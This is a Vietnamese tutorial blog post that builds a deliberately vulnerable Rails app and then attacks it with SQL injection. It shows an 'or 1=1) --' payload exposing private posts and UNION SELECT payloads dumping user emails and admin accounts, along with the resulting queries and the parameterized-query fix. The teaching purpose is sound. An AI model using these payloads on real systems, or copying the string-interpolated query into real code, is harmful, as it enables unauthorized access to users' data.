## Mở đầu
SQL injection là một lỗ hổng bảo mật cho phép hacker truy cập thông tin cá nhân trong cơ sở dữ liệu. Điều này có thể làm lộ thông tin người dùng như email, địa chỉ, số điện thoại hoặc nhạy cảm như thông tin thẻ tín dụng.
Hầu hết các frameworks đều có các phương pháp để ngăn chặn điều này, nhưng lỗ hổng bảo mật này vẫn có thể xảy ra nếu lập trình viên không cẩn thận.
Cách tốt nhất để tránh gặp phải điều này là bạn phải hiểu nó, biết cách tấn công trang web bằng SQL Injection. Hãy cùng tìm hiểu SQL Injection trong ứng dụng Rails
## Bài viết này gồm 3 phần
1. Khái niệm về SQL Injection
2. Phát triển một trang web bằng Rails 
3. Tấn công trang web bằng SQL Injection
## 1. Khái niệm về SQL Injection
### SQL Injection là gì?
SQL injection là chèn 1 câu truy vấn SQL vào một input field được chạy trực tiếp đến cơ sở dữ liệu.
Điều này được cho phép khi một ứng dụng can thiệp vào input của người dùng vào một truy vấn SQL ở phía back end.
Ví dụ:
Đoạn code dưới đây trả về những bài post tương ứng với truy vấn của người dùng
```
Post.where("title = '#{query}' and private = false")
```
Khi người dùng nhập vào input field với nội dung "Wine Food Pairings", câu lệnh SQL dưới đây được thực hiện và sẽ không có vấn đề gì xảy ra
```
SELECT "posts".* FROM "posts" WHERE (title = 'Wine Food Pairings' and private = false)
```
Nhưng khi người dùng nhập vào input field nội dung `Wine Food Pairings’ or 1=1) --`, SQL  sau đây được thực thi.
```
SELECT "posts".* FROM "posts" WHERE (title = 'Wine Food Pairings' or 1=1) -- and private = false)
```
Và vấn đề xảy ra ở đây là gì?
Câu truy vấn sau kí tự  `--` sẽ không được thực thi (`--` sẽ định nghĩa 1 comment trong SQL) và những bản ghi (ở đây là bài post) có trường `private` với giá trị `true` vẫn sẽ được truy vấn.
Đoạn code dưới đây sẽ ngăn chặn được điều này.
```
Post.where("title = ? and private = false", title)
```
#### Đây là 1 ví dụ điển hình cho việc tấn công lỗ hổng bảo mật bằng SQL Injection. Chúng ta sẽ cùng tìm hiểu các trường hợp khác qua phần dưới đây

## 2. Tạo 1 trang web bằng Rails
Ở phần này chúng ta sẽ tạo một trang web sau đó sẽ tấn công trang web này bằng SQL Injection. 
### Khởi tạo project mới
Phần này mình sẽ nói ngắn gọn.
Trong terminal, viết các lệnh sau
```
$ rails new hackerapp
$ cd hackerapp
$ sudo bundle install
```
Project này mình sẽ thêm 2 `gem` khá quen thuộc là `gem 'pg' và gem 'devise'`. Trong file có tên `Gemfile` bạn thêm vào 2 dòng sau
```
gem 'pg'
gem 'devise'
```
sau đó dùng lệnh `$ sudo bundle install` để cài đặt 2 gem trên.
Sau đó cái tạo database với lệnh `$ rails db:create`
### Thêm chức năng loggin
Ở đây chúng ta sẽ sử dụng `gem 'devise'` vừa thêm ở bước trên. Để cài đặt chúng ta sử dụng lệnh `$ rails generate devise:install`
Trong Rails, một `model` là một `class`. Ruby ánh xạ tới một bảng cơ sở dữ liệu và đơn giản hóa việc thực hiện các `transation` DB thông qua ORM, Active Record của nó.
Sử dụng chức năng loggin với model `user` bằng lệnh sau:
```
$ rails generate devise user
```
Tạo màn hình loggin bằng lệnh 
```
$ rails generate devise:views users
```
Thêm các trường cần thiết cho model `user`
Đầu tiên tạo file `migration`
```
$ rails g migration AddAdminToUsers
```
Trong thư mục `/db/migrate/` sẽ có 1 file tên là `add_admin_to_user.rb`. Trong file này chúng ta thêm đoạn code sau:
```
class AddAdminToUsers < ActiveRecord::Migration[5.2]
  def change
    add_column :users, :admin, :boolean, default: false
    add_column :users, :address, :string, default: ''
  end
end
```
Sau đó dùng lệnh `$ rails db:migrate`. Thao tác này sẽ thêm hai cột này vào bảng `user` trong cơ sở dữ liệu.
### Thêm model Post
Với model `post` chúng ta sẽ cần các hành động cơ bản CRUD. Câu lệnh sau sẽ tạo model `post` cùng với controller với các action CRUD cũng như các màn hình CRUD tương ứng
```
$ rails g scaffold Post title:string content:string
$ rails db:migrate
```
Trong thư mục `/config/routes.rb` thêm đoạn `root 'posts#index'` để trang web của chúng ta sẽ mặc định đi đến trang `index` của model `post`. File `routes.rb` sẽ có nội dung như sau:
```
Rails.application.routes.draw do
  resources :posts
  devise_for :users

  root 'posts#index'
end
```
Bây giờ khởi động lại server và truy cập vào đường dẫn ` http://localhost:3000/` và trang web sẽ hiển thị nội dung trang `index` của model post

![](https://images.viblo.asia/90c48528-c3ae-4382-b533-dfb4f1a7c629.png)

Ở màn hình này hãy tạo một vài bản ghi để thử xem chức năng CRUD có hoạt động hay không.

Ở trên chúng ta đã thêm phần xác thực người dùng với gem `Devise` nhưng cần thêm một vài đoạn code để có thể hiển thị thêm thông tin rằng chúng ta đã đăng nhập hay chưa.
Trong file `/app/views/layouts/application.html.erb` chúng ta sẽ sửa lại như sau:
```
<!DOCTYPE html>
<html>
  <head>
    <title>Hackerapp</title>
    <%= csrf_meta_tags %>

    <%= stylesheet_link_tag    'application', media: 'all', 'data-turbolinks-track': 'reload' %>
    <%= javascript_include_tag 'application', 'data-turbolinks-track': 'reload' %>
  </head>

  <body>
    <% if current_user %>
      <h3>
        <%= 'Hi ' + current_user.email %>
      </h3>
      <%= link_to "Log out", destroy_user_session_path, method: :delete %>
    <% else %>
      <%= link_to "Sign in", new_user_session_path %>
      <%= link_to "Sign up", new_user_registration_path %>
    <% end %>

    <br />

    <%= yield %>
  </body>
</html>
```
Bây giờ hãy click vào phần  “Sign up” ở trên cùng bên trái của trang web và tạo tài khoản cho mình. Sau khi đăng ký xong màn hình của bạn sẽ hiển thị như hình dưới

![](https://images.viblo.asia/96a5bb47-3338-4a00-8d34-e91dd0aa1e36.png)

Thêm một cột nữa vào model `Posts` bằng cách tạo một file migration khác
```
$ rails g migration AddPrivateToPosts
```
sau đó chạy lệnh `$ rake db:migrate`

### Thêm một vài dữ liệu để hiển thị lên trang web của mình
Tạo một file có tên là `seed_data.rake` trong thư mục `/lib/task/`. Với nội dung
```
task seed_data: :environment do

  # generate users
  User.create(email: 'dave@gmail.com', password:'j8943ifjfs', address: '123 Mill Street', admin: true)
  User.create(email: 'jenny@gmail.com', password:'9u9f0f43', address: '7 Fancy Lane', admin: true)
  User.create(email: 'george@gmail.com', password:'fjkdfjkg', address: '1 Butterville', admin: false)
  User.create(email: 'sally@gmail.com', password:'mdnddjnc', address: '55 Bluestreet', admin: false)
  User.create(email: 'kim@gmail.com', password:'479fjf3', address: '54 Tall Cressant', admin: false)


  # generate posts
  Post.create(title: 'My Passwords', content: 'The server password is 12345678', private:true)
  Post.create(title: 'Employee Directory', content: '...', private:true)
  Post.create(title: 'Types of Cheese', content: 'Brie, Cheddar, Moz...', private:false)
  Post.create(title: 'Wine Food Pairings 1', content: 'White wine goes with...', private:false)
  Post.create(title: 'Wine Food Pairings 2', content: 'Red wine goes with...', private:false)
  Post.create(title: 'WFH Best Habits', content: 'Dont go on facebook...', private:false)
  Post.create(title: 'Dog Names', content: 'Ruff, Woof, Bark...', private:false)
end
```
Chạy lệnh `$ rake seed_data` để tạo các bản ghi vào trong DB
Bây giờ trang web của chúng ta đã sẵn sàng để sử dụng các chứng năng như đăng nhập, đăng xuất, CRUD với model `Posts`
### Thêm tính năng search
Bây giờ, chúng ta sẽ tạo một form tìm kiếm để lấy ra các bài `posts` được hiển thị. Đây sẽ là nơi để chúng ta sẽ tấn công bằng SQL Injection.
Trong file `app/views/posts/index.html.erb` chúng ta thêm vào dưới dòng `<h1>Posts</h1>` đoạn code sau:
```
<hr />
<%= form_tag posts_path, method: :get do %>
  <%= text_field_tag name="post[query]", '', size:100 %>
  <%= submit_tag 'Filter' %>
<% end %>
<hr />
```
Đoạn code này sẽ cho phép chúng ta nhập dữ liệu để tìm kiếm các bài `posts`.
Sau đó trong controller `/app/controllers/posts_controller.rb` chúng ta sẽ thêm logic xử lý những giá trị đầu vào từ form search để lấy ra các bài `posts` tương ứng
```
def index
  query = params[:post][:query] if params.include?("post")

  if query && !query.empty?
    @posts = Post.where("title = '#{query}' and private = false")
  else
    @posts = Post.where(private: false)
  end
end
```

## 3. Tấn công trang web bằng SQL Injection
Hơi dài dòng một chút nhưng bây giờ sẽ đến phần chính của bài viết này. Sau khi đã tạo thành công trang web với các chức năng cơ bản và tạo ra một số dữ liệu mẫu, sau khi đăng nhập, trang web của chúng ta sẽ hiển thị như hình dưới

![](https://images.viblo.asia/db08a7d9-92be-41e7-b60a-c4ba77910ac5.png)

Ở đây chỉ những bài post có trạng thái `public` (private = false) mới được hiển thị (hàm index có đoạn truy vấn `@posts = Post.where("title = '#{query}' and private = false")`)
Hãy cùng khai thác vài lỗi bảo mật (SQL Injection) mà trang web này đang gặp phải

### 1. Get private posts
Đây là ví dụ từ phần giới thiệu. Nhập nội dung sau vào ô tìm kiếm `Wine Food Pairings' or 1=1) --`

![](https://images.viblo.asia/5cb8342c-56fc-4cdb-a2b2-a8fb791f21b4.png)

Dấu `--` đã chặn câu truy vấn `private = false` trong câu truy vấn chúng ta đã viết ở controller. Điều này đã thực thi câu truy vấn:
```
Post Load (0.3ms)  SELECT "posts".* FROM "posts" WHERE (title = 'Wine Food Pairings' or 1=1) --' and private = false)
```
Như đã nói ở trên, dấu `--` là 1 cú pháp định nghĩa 1 `comment` trong ngôn ngữ SQL vì thế câu lệnh `private = false` sẽ không được thực thi. Điều này dẫn đến kết quả search của chúng ta như sau:

![](https://images.viblo.asia/3e7c6963-e370-4f87-83f1-2fc95c587a53.png)

2 bài `posts` có title `My Passwords` và `Employee Directory` mặc dù có giá trị `private = true` nhưng vẫn được hiển thị trong kết quả tìm kiếm.

### 2. Get all user emails in the database
Form search chúng ta vừa làm không thiết kế để trả về một `users`. Nhưng chúng ta vẫn có thể làm điều này xảy ra.
Nhập vào form tìm kiếm nội dung sau: `Cheese') union select 1, email,'', null, null, true from users -- `
Sau khi ấn button Filter, câu truy vấn sau sẽ được thực hiện:
```
Post Load (0.6ms)  SELECT "posts".* FROM "posts" WHERE (title = 'Cheese') union select 1, email,'', null, null, true from users --' and private = false)
```
Đoạn input trên đã thực hiện câu lệnh [onion](https://www.w3schools.com/sql/sql_union.asp) để liên kết bảng `posts` và bảng `users` và hiển thị những bản ghi của bảng `users` 
Kết quả sẽ như sau:

![](https://images.viblo.asia/3e7c6963-e370-4f87-83f1-2fc95c587a53.png)

Tất cả mọi thông tin của bảng `users` đã hiển thị ra ở màn hình này.

### 3. Find which users are admins
Nếu muốn biết ai trong số những người dùng trên là `admin`, chúng ta chỉ cần sửa đổi một chút ở nội dung input.
Input: `Cheese') union select 1,email,'', null, null, true from users where admin = true --`
Câu truy vấn sau sẽ được thực thi: 
```
Post Load (0.6ms)  SELECT "posts".* FROM "posts" WHERE (title = 'Cheese') union select 1,email,'', null, null, true from users where admin = true --' and private = false)
```
Và trả về kết quả như sau:

![](https://images.viblo.asia/0f3d8c3d-33ec-41ca-882c-7d1a0d5c5bae.png)

Là một người xấu, việc chiếm được quyền `admin` của một trang web là rất nguy hiểm. Chúng có thể lấy được mọi thông tin của người dùng như email, số điện thoại hoặc các thông tin nhạy cảm mà chỉ admin mới có thể biết.

## 4. Tổng kết 
Bài viết này không nhằm mục đích dạy bạn cách hack các ứng dụng web. Bài viết chỉ cho bạn biết cách hoạt động của SQL injection và thiệt hại mà lỗi bảo mật có thể gây ra để biết cách phòng tránh và đừng viết code không cẩn thận gây 
ra những thiệt hại không đáng có.

Bài viết còn nhiều thiếu sót, mong mọi người thông cảm. Cám ơn mọi người đã đọc bài viết của mình,

## 5. Nguồn 
https://medium.com/better-programming/learn-sql-injection-by-ethically-hacking-a-rails-app-e96906f8c593